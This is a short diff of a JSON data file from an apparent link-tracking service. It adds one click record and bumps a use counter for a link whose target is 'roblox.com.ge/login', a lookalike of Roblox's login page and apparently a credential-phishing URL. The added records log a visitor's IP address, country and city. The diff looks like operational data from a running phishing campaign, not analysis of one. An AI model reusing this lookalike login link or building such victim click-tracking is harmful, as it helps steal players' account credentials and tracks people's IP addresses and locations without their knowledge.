@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 988,
+    "useCount": 989,
     "createdBy": "admin",
     "clicks": [
       {
@@ -8019,6 +8019,14 @@
       },
       {
         "timestamp": 1777219282741,
+        "ip": "105.112.105.108",
+        "country": "Nigeria",
+        "city": "Benin City",
+        "flag": "🇳🇬",
+        "countryCode": "NG"
+      },
+      {
+        "timestamp": 1777219335140,
         "ip": "105.112.105.108",
         "country": "Nigeria",
         "city": "Benin City",
